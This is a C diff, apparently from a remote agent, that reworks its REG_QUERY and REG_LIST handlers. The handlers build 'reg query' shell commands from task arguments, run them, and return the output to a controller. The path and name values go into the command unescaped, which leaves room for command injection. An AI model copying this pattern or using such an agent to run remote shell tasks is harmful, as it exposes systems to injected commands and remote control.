@@ -2634,11 +2634,27 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out ? out : "", ""); free(out);
     }
     else if (strcmp(type_upper, "REG_QUERY") == 0) {
-        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" 2>&1",args);
+        char path[512] = {0}, name[256] = {0};
+        if (args && args[0] == '{') {
+            json_get_str(args, "path", path, sizeof(path), "");
+            json_get_str(args, "name", name, sizeof(name), "");
+        } else if (args) {
+            strncpy(path, args, sizeof(path) - 1);
+        }
+        char cmd2[1024];
+        if (name[0])
+            snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" /v \"%s\" 2>&1", path, name);
+        else
+            snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" 2>&1", path);
         char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "REG_LIST") == 0) {
-        char cmd2[512]; snprintf(cmd2,sizeof(cmd2),"reg query \"%s\" /s 2>&1",args);
+        char path[512] = {0};
+        if (args && args[0] == '{')
+            json_get_str(args, "path", path, sizeof(path), "");
+        else if (args)
+            strncpy(path, args, sizeof(path) - 1);
+        char cmd2[1024]; snprintf(cmd2, sizeof(cmd2), "reg query \"%s\" /s 2>&1", path);
         char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "REG_SET") == 0) {
